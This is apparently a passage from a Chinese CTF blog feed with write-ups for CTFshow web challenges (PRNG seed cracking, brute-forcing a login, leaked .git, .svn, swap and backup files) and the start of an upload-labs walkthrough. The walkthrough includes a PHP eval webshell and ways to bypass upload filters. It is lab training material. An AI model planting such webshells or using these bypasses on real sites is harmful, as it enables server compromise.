title="方案一"></a>方案一</h2><p>代码中的<code>mt_srand()</code>为随机数生成器设定种子，可以之后调用随机数生成器，可以保证随机数生成的相同。所以这题很明确了，直接找到生成的随机数即可。<br>用PHPStorm找一下：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$a &#x3D; mt_srand(372619038);$b &#x3D; mt_rand();echo $b;?&gt;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677830788193-57352fa8-4703-4b29-b7b6-6b8e4eeaa326.png" alt="image.png"><br>然后直接get传入即可：<img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677830905489-9c6c4461-458d-4ca6-a1a2-9638ac7bf795.png" alt="image.png"></p><h1 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h1><blockquote></blockquote><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);if(isset($_GET[&#39;r&#39;]))&#123;    $r &#x3D; $_GET[&#39;r&#39;];    mt_srand(hexdec(substr(md5($flag), 0,8)));    $rand &#x3D; intval($r)-intval(mt_rand());    if((!$rand))&#123;        if($_COOKIE[&#39;token&#39;]&#x3D;&#x3D;(mt_rand()+mt_rand()))&#123;            echo $flag;        &#125;    &#125;else&#123;        echo $rand;    &#125;&#125;else&#123;    highlight_file(__FILE__);    echo system(&#39;cat &#x2F;proc&#x2F;version&#39;);&#125;</code></pre><p>其中<code>hexdec()</code>函数将十六进制转化为十进制。<br><del>猪脑过载了，开始打算写脚本跑出来第一个（第七行）的mt_rand()的值，但似乎直接给r传入0就行……</del><br>直接将r传入0，得到第一个mt_rand的值<code>1277101134</code>（即时生成的）。这时候，我们的目标就转化为尝试找到原种子的值。在搜索之后，发现有一个php_mt_seed的项目可以尝试破解出原种子的值。</p><h2 id="php-mt-seed"><a href="#php-mt-seed" class="headerlink" title="php_mt_seed"></a>php_mt_seed</h2><p>下载：<a href="https://www.openwall.com/php_mt_seed/">https://www.openwall.com/php_mt_seed&#x2F;</a><br>下载之后直接在kali中解压中即可（可以使用windows，但是需要g++编译，因为之前没安装过）<br>解压之后需要先make一下生成文件（我这里刚刚更新过）</p><pre class="language-php" data-language="php"><code class="language-php">make</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677839965380-57f4b720-0465-4dba-8c73-d7ace551f01b.png" alt="image.png"><br>然后</p><pre class="language-php" data-language="php"><code class="language-php">time .&#x2F;php_mt_seed 1277101134</code></pre><p>等待它找到seed。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677840306922-3ff2ae19-0589-40ec-93d8-516e45d2ee81.png" alt="image.png"><br>然后将生成的mt_rand()的结果相加：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$a &#x3D; array(3352708826, 3352708827, 72059293, 379534775, 2177040484, 2437797623, 3102727756, 3907641824);for ($f &#x3D; 0; $f &lt; 11; $f++)&#123;    mt_srand($a[$f]);    echo $f;    echo &quot;\n&quot;;    echo mt_rand();    echo &quot;\n&quot;;    $b &#x3D; mt_rand();    echo $b;    echo &quot;\n&quot;;    $c &#x3D; mt_rand();    echo $c;    echo &quot;\n&quot;;    echo $b + $c;    echo &quot;\n&quot;;    echo &quot;\n&quot;;&#125;?&gt;</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677840379255-b1b12693-291d-4300-a0c8-4005848709f9.png" alt="image.png"><br>然后就是一个一个尝试进去得到flag：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677839267980-50ace50b-01b0-4096-b744-2d70dec7b52a.png" alt="image.png"></p><h1 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h1><p>上来就是连接数据库，但是似乎全为空的时候就连接成功了，应该是bug。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677841398062-c31cda10-af2d-4736-8121-f604790b2cf7.png" alt="image.png"><br>爆破的话可能费点劲了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677841574076-21b6d96c-5e80-4497-bd55-a7e4f7f0384c.png" alt="image.png"></p><h1 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h1><h2 id="方案一-1"><a href="#方案一-1" class="headerlink" title="方案一"></a>方案一</h2><p>这题有点意思，上来就是一个登陆页面：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677841752959-36877d3f-2eca-42a6-b8e8-70ab983382da.png" alt="image.png"><br>下方有一个录取名单获取，下载一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677841938577-d558f1b0-499c-4b86-a062-0528b771ee58.png" alt="image.png"><br>网页中还有一个学籍管理系统，估计就是用这个来查找了，我们可以尝试爆破这个页面：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842002490-837a816c-6a10-4154-8a59-f4f2f9033cd3.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842443902-30f3d0b2-3f79-443d-afa2-ae744d5a6792.png" alt="image.png"><br>修改payload类型<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842468948-8d5e1435-2827-455c-b534-16d03b9b06a2.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842490721-bc38685b-9fc7-4cbf-a36c-a8951f791ee3.png" alt="image.png"><br>然后直接查询。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842525622-e75d02c1-6eb3-4b39-bc82-a824d5041a80.png" alt="image.png"><br>这下就得到了账号：02015237 密码：621022199002015237<br>返回去登陆页面。登录即可<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842624036-ffaab3b1-0968-4738-a3b2-4762e09e66c0.png" alt="image.png"></p><h2 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h2><p>wp提供的脚本：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F;621022********5237$myfile &#x3D; fopen(&quot;zid.txt&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);for($year&#x3D;1990;$year&lt;1993;$year++)&#123;for($mon&#x3D;1;$mon&lt;10;$mon++)&#123;for($day&#x3D;01;$day&lt;10;$day++)&#123;$txt&#x3D;(&#39;621022&#39;.$year.&#39;0&#39;.$mon.&#39;0&#39;.$day.&#39;5237&#39;).&quot;\n&quot;;fwrite($myfile, $txt);&#125;&#125;&#125; for($year&#x3D;1990;$year&lt;1993;$year++)&#123;for($mon&#x3D;1;$mon&lt;10;$mon++)&#123;for($day&#x3D;10;$day&lt;&#x3D;31;$day++)&#123;$txt&#x3D;(&#39;621022&#39;.$year.&quot;0&quot;.$mon.$day.&#39;5237&#39;).&quot;\n&quot;;fwrite($myfile, $txt);&#125;&#125;&#125; for($year&#x3D;1990;$year&lt;1993;$year++)&#123;for($mon&#x3D;10;$mon&lt;&#x3D;12;$mon++)&#123;for($day&#x3D;10;$day&lt;&#x3D;31;$day++)&#123;$txt&#x3D;(&#39;621022&#39;.$year.$mon.$day.&#39;5237&#39;).&quot;\n&quot;;fwrite($myfile, $txt);&#125;&#125;&#125; for($year&#x3D;1990;$year&lt;1993;$year++)&#123;for($mon&#x3D;10;$mon&lt;&#x3D;12;$mon++)&#123;for($day&#x3D;01;$day&lt;10;$day++)&#123;$txt&#x3D;(&#39;621022&#39;.$year.$mon.&quot;0&quot;.$day.&#39;5237&#39;).&quot;\n&quot;;fwrite($myfile, $txt);&#125;&#125;&#125; fclose($myfile);</code></pre><h1 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h1><p>上来页面中什么也没有，但是注意到域名中有蹊跷：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842814104-e64b62a2-3eca-40a7-86fb-7f2805ba5979.png" alt="image.png"><br>提示里面写了只用爆破目录即可，因此修改intruder。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677844522366-e4a15f61-248c-4cb6-a093-587a7d4381a4.png" alt="image.png"></p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>他说的爆破目录修改的payload应该是：<code>/0/1/</code>而不是<code>/0/1</code>，后者会返回重定向301</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web1-20信息收集篇</title>
      <link href="/posts/ae9416d/"/>
      <url>/posts/ae9416d/</url>
      
        <content type="html"><![CDATA[<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><blockquote><p>开发注释未及时删除</p></blockquote><p>直接f12源代码内存在flag</p><h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><blockquote><p>js前台拦截 &#x3D;&#x3D;&#x3D; 无效操作</p></blockquote><p>虽然禁止了右键和f12来打开开发者模式，但是chrome可以在更多工具中找到开发工具并打开。flag在源代码中。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677482893019-176e18a5-68f2-4408-8e72-8fbdacff4286.png" alt="image.png"></p><h2 id="others"><a href="#others" class="headerlink" title="others"></a>others</h2><p>看了wp之后发现还有几种方法：</p><ul><li>在url前面加上<code>view-source:</code></li><li>下载源码</li><li>在很短的时间内按f5和f12</li><li><code>ctrl + U</code>查看源代码</li><li>打开一个空白网页，然后按F12，接着再把网址复制进去并回车</li></ul><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><blockquote><p>没思路的时候抓个包看看，可能会有意外收获</p></blockquote><p>直接burpsuite抓包，返回包中在请求头中存在flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677483548818-27ec80b1-54a1-4dab-846c-caaf3559d6d1.png" alt="image.png"></p><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><blockquote><p>总有人把后台地址写入robots，帮黑阔大佬们引路。</p></blockquote><p>提示的已经很明显了，访问对应的反爬robots页面：<code>/robots.txt</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677483894393-32a3362c-c5f6-4237-b686-ce72a15d9d05.png" alt="image.png"><br>再次访问对应页面，得到flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677483939660-670394f2-b08d-4c8c-b197-afd1b1cc11f3.png" alt="image.png"></p><h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><blockquote><p>phps源码泄露有时候能帮上忙</p></blockquote><p>根据提示，这道题估计需要扫备份文件了。因此尝试去扫，但是换了好几个软件都没有扫到，看了wp，发现是：<code>index.phps</code>文件。<br>访问对应地址下载文件，可以看到flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677487363497-cfbb986a-e286-47d7-8034-1a70668ca14b.png" alt="image.png"></p><h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><blockquote><p>解压源码到当前目录，测试正常，收工</p></blockquote><p>一眼丁真，还是扫，继续扫。这个的目标文件是<code>www.zip</code>扫出来再解压打开即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677487513876-637eeffe-876d-4fa7-bfa7-171b5c25a78a.png" alt="image.png"></p><h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><blockquote><p>版本控制很重要，但不要部署到生产环境更重要。</p></blockquote><p>根据提示可以判断出是git泄露的题目（扫也可以），直接访问git中的<code>index.php</code>文件，访问地址：<br><code>url/.git/index.php</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677487895563-63a6899d-9a87-46a6-9376-d5610eed2ea8.png" alt="image.png"></p><h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><blockquote><p>版本控制很重要，但不要部署到生产环境更重要。</p></blockquote><p>除了git版本控制之外，这道题使用了svn控制版本。disreach扫描，发现有<code>.svn</code>泄露。因此我们直接访问：<code>url/.svn</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677488199030-63ba484d-0295-43c6-ae30-881cdee6af47.png" alt="image.png"></p><h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><blockquote><p>发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p></blockquote><p>考察的是vim缓存泄露，即类似windows上编辑word文件，linux在vim编辑文件时也会产生缓存文件，如果像题目一样意外退出则会保存缓存文件。<br>以index.php来说，第一次退出后，缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo,第三次退出后文件名为.index.php.swn。<br>因此直接访问<code>url/index.php.swp</code>即可获取到文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677488692685-e9c7a051-b68e-4f1d-8382-f1083fbfc606.png" alt="image.png"></p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>linux文件前面这个点指的是隐藏文件的意思，可能不需要加点也可以访问。</p><h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><blockquote><p>cookie 只是一块饼干，不能存放任何隐私数据</p></blockquote><p>根据题目，可以猜想可能是cookie里面藏东西了，因此尝试f12-网络监测：<br>在回传包中发现：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677489361977-d6445a0a-9884-4913-8885-8c470b582a18.png" alt="image.png"></p><h1 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h1><blockquote><p>域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息、</p></blockquote><h1 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h1><blockquote><p>有时候网站上的公开信息，就是管理员常用密码</p></blockquote><p>访问网站，访问<code>robots.txt</code>。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677659086016-6482b784-18cc-4bd5-becd-347016c50a89.png" alt="image.png"><br>访问地址，发现需要账号密码，根据提示，猜想账号admin，密码为对网页末尾电话。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677659155796-072b792a-f76d-449f-8574-15e07c5d1825.png" alt="image.png"><br>成功登录获取到flag。</p><h1 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h1><blockquote><p>技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p></blockquote><p>根据提示，可以在主页中最底部发现有<code>document</code>，下载文档。文档中即有登录账号密码：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677659750747-db64cb0e-fc5a-4cb4-bc94-4d6fffe1071f.png" alt="image.png"><br>登录对应地址，并输入对应账号密码，获得flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677659800472-5c848c58-2560-4e62-867c-48ecbc15cc4d.png" alt="image.png"></p><h1 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h1><blockquote><p>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p></blockquote><p>查看源码源码中上传图片的位置暴露了比编辑器地址：<code>/editor</code>（当然也可以扫描出来）<br>然后根据提示，在插入文件中选择文件空间。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677661001765-ed170db3-ec48-48ff-8e84-fa8e456d352d.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677661012463-5891556a-d14c-40b1-abc5-11107aa67e4f.png" alt="image.png"><br>经过搜索，发现如下地址：<code>/editor/attached/file/var/www/html/nothinghere/fl000g.txt</code><br>前面是网站根目录，直接访问：<code>nothinghere/fl000g.txt</code>得到flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677661160331-f88eb97f-1984-4d6f-af3a-fe7680e70d73.png" alt="image.png"></p><h1 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h1><blockquote><p>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p></blockquote><p>经过扫描发现存在<code>/admin</code>访问。内有一个登陆系统，系统存在忘记密码找回，发现密保问题为居住地址。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677661547444-07d88c82-2efe-47b1-af59-eb3a41fcf40c.png" alt="image.png"><br>可以根据about关于界面最下方的电话号查询所属地。但是查询了发现电话不存在。发现主页有qq邮箱，用qq查询：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677662044749-a963e17b-36fb-406e-aca0-50e68524087f.png" alt="image.png"><br>输入后重置密码，登录获取到flag：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677662272962-b2d18581-e88b-4f85-8830-7ee5dc25dd01.png" alt="image.png"></p><h1 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h1><blockquote><p>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p></blockquote><p>根据提示，我们可以了解到这道题用到了探针，访问：<code>tz.php</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677662498104-ab17d3fd-d09e-4d37-bdb8-c279c78be35d.png" alt="image.png"><br>我们可以在php相关参数一栏中查看到<code>phpinfo()</code>，在页面中搜索flag，发现在环境中有flag字段：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677662734509-e50900a3-d143-43b1-858e-e1d83fbbae0c.png" alt="image.png"></p><h1 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h1><blockquote><p>备份的sql文件会泄露敏感信息</p></blockquote><p>扫，发现它的备份名称为：<code>backup.sql</code>，下载对应包，可以看到文件内有flag：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663254137-edde1c49-2d30-4625-b7c7-596ad117da73.png" alt="image.png"></p><h1 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h1><blockquote><p>不要着急，休息，休息一会儿，玩101分给你flag</p></blockquote><p>游戏题，直接查看源代码，查看<code>Flappy_js.js</code>文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663432915-94befbb5-3da7-4037-9c98-dc3add8ab8d7.png" alt="image.png"><br>发现里面有对分数判断：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663480194-bc8f1dc4-7e5e-4e9a-9229-a2d5c2b7ae4e.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663488999-1aeb987f-2d46-4d08-addd-57bc00045cf7.png" alt="image.png"><br>根据结果访问对应<code>110.php</code>获得flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663518588-a91f1d72-0f50-4610-80ec-6e350e3f0e9d.png" alt="image.png"></p><h1 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h1><blockquote><p>密钥什么的，就不要放在前端了</p></blockquote><p>f12查看源代码，发现php代码：</p><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);$flag&#x3D;&quot;fakeflag&quot;$u &#x3D; $_POST[&#39;username&#39;];$p &#x3D; $_POST[&#39;pazzword&#39;];if(isset($u) &amp;&amp; isset($p))&#123;    if($u&#x3D;&#x3D;&#x3D;&#39;admin&#39; &amp;&amp; $p &#x3D;&#x3D;&#x3D;&#39;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#39;)&#123;        echo $flag;    &#125;&#125;</code></pre><p>直接根据提示post传入账号密码即可：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663807340-ae78657e-3980-404f-af6d-9b57d1a4b7c7.png" alt="image.png"></p><h1 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h1><blockquote><p>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p></blockquote><p>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加&#x2F;db&#x2F;db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database}<br>虽然内容乱码了，但是可以直接搜索flag字段来找到flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677664080200-59170fc9-2d27-41ea-9514-447d48d68017.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>uploads-lab之旅</title>
      <link href="/posts/609b154f/"/>
      <url>/posts/609b154f/</url>
      
        <content type="html"><![CDATA[<p>准备材料：</p><ul><li>phpstudy：<a href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a></li><li>uploads-lab：<a href="https://gitcode.net/mirrors/tj1ngwe1/upload-labs?utm_source=csdn_github_accelerator">https://gitcode.net/mirrors/tj1ngwe1/upload-labs?utm_source&#x3D;csdn_github_accelerator</a></li></ul><h4 id="uploads-lab的搭建"><a href="#uploads-lab的搭建" class="headerlink" title="uploads-lab的搭建"></a>uploads-lab的搭建</h4><p>uploads-lab下载为zip文件，并解压在phpstudy下的www文件夹内，注意将文件夹重命名为uploads-lab。<br>解压成功后访问 <a href="http://127.0.0.1/upload-labs">http://127.0.0.1/upload-labs</a> 打开即可(PS:部分人burpsuite可能使用本机地址无法抓包，建议127.0.0.1修改为本机地址！)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673542456881-755e93e5-08db-4264-893b-3434505bba58.png" alt="image.png"></p><h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p>任务：上传一个<code>webshell</code>到服务器。<br>首先先尝试直接传一个一句话木马<code>webshell.php</code></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php  eval(_POST[1]);?&gt;</code></pre><p>上传失败，提示：该文件不允许上传，请上传.jpg|.png|.gif类型的文件,当前文件类型为：.php<br>查看源码：</p><pre class="language-php" data-language="php"><code class="language-php">function checkFile() &#123;    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;        alert(&quot;请选择要上传的文件!&quot;);        return false;    &#125;    &#x2F;&#x2F;定义允许上传的文件类型    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;    &#x2F;&#x2F;提取上传文件的类型    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));    &#x2F;&#x2F;判断上传文件类型是否允许上传    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;        alert(errMsg);        return false;    &#125;&#125;</code></pre><p>f12查看源代码，发现把函数放在了前端<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673544303968-26e4e437-558e-4377-b9cb-d552fc971cc2.png" alt="image.png"></p><h2 id="方法一-禁用js"><a href="#方法一-禁用js" class="headerlink" title="方法一 禁用js"></a>方法一 禁用js</h2><p>直接浏览器禁用js<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673545764014-6f3370b8-3730-4849-8d0e-57c5a2741143.png" alt="image.png"><br>上传成功，用antsword测试连接，成功<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673546203765-a912ec10-9c39-4ed9-a479-d91042847e7f.png" alt="b4797b0734fbfd3618d946ec7938912.png"></p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>修改文件后缀名为<code>webshell.png</code>上传，打开burpsuite抓包：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673546459582-bb57208f-a5e1-4b13-aec7-00f92787e614.png" alt="image.png"><br>将filename参数修改文件后缀<code>.php</code><br>用antsword测试连接，成功</p><h2 id="方法三（重要）"><a href="#方法三（重要）" class="headerlink" title="方法三（重要）"></a>方法三（重要）</h2><p>右键页面-查看网站源代码-全部复制下来-保存为html后缀文件，找到文件中的js代码，删除。删除代码：</p><pre class="language-php" data-language="php"><code class="language-php">function checkFile() &#123;        var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;        if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;            alert(&quot;请选择要上传的文件!&quot;);            return false;        &#125;        &#x2F;&#x2F;定义允许上传的文件类型        var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;        &#x2F;&#x2F;提取上传文件的类型        var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));        &#x2F;&#x2F;判断上传文件类型是否允许上传        if (allow_ext.indexOf(ext_name) &#x3D;&#x3D; -1) &#123;            var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;            alert(errMsg);            return false;        &#125;    &#125;</code></pre><p>这时我们运行这个HTML文件，UI仍然会显示，但是由于我们已经删除了js函数，所以我们不知道要将文件传到哪里。<br>我们回到原网页，右键页面-检查-网络，上传文件，看到上传的图片的请求网址。（这一步用burpsuite也可以）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673609137323-2d967bd6-143f-41ce-b1da-dc95476ccd17.png" alt="7c0ae6a5a632a3866408524ad8e7a72.png"><br>知道请求网址了就可以给html文件添加action了，action是告诉他这个图片提交给谁，因为这个源代码中没有，我们就自己加一个。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673609254796-cf64222b-d921-4e97-93cf-19ce4510b673.png" alt="7c0ae6a5a632a3866408524ad8e7a72.png"><br>添加好之后重新运行html文件，再上传<code>webshell.php</code>文件，直接就可以上传成功。</p><h1 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h1><p>要求：上传一个<code>webshell</code>到服务器。</p><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;$msg &#x3D; null;&#x2F;&#x2F;判断是否上传submit参数if (isset($_POST[&#39;submit&#39;])) &#123;    &#x2F;&#x2F;检查文件或目录是否存在    if (file_exists($UPLOAD_ADDR)) &#123;        &#x2F;&#x2F;允许传输 .jpg&#x2F;.png&#x2F;.gif 后缀文件        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#123;            &#x2F;&#x2F;将上传的文件移动到新位置            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;                $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;];                $is_upload &#x3D; true;            &#125;        &#125; else &#123;            $msg &#x3D; &#39;文件类型不正确，请重新上传！&#39;;        &#125;    &#125; else &#123;        $msg &#x3D; $UPLOAD_ADDR.&#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p>这一关是常见验证中的文件类型验证，也就是验证MIME信息，将<code>webshell.php</code>改为<code>webshell.png</code>，并上传，在burp抓包处修改文件名为<code>webshell.php</code>，即可上传成功，antsword连接测试成功。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673605350606-8477e614-1e6f-42f6-83e0-611ea73de702.png" alt="image.png"></p><pre class="language-php" data-language="php"><code class="language-php">------WebKitFormBoundary09G9BBRK49OTlzSHContent-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;webshell.png&quot;&#x2F;&#x2F;将这里修改为webshell.phpContent-Type: image&#x2F;png&lt;?php @eval($_POST[1]);?&gt;</code></pre><p>或者直接上传<code>webshell.php</code>文件，因为检测的是<code>Content-Type</code>参数，所以直接将其修改为<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>三种之一即可。</p><h1 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;$msg &#x3D; null;&#x2F;&#x2F;定义submit参数if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists($UPLOAD_ADDR)) &#123;        $deny_ext &#x3D; array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空        if(!in_array($file_ext, $deny_ext)) &#123;            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR. &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;                 $img_path &#x3D; $UPLOAD_ADDR .&#39;&#x2F;&#39;. $_FILES[&#39;upload_file&#39;][&#39;name&#39;];                 $is_upload &#x3D; true;            &#125;        &#125; else &#123;            $msg &#x3D; &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;        &#125;    &#125; else &#123;        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><h2 id="解法-1"><a href="#解法-1" class="headerlink" 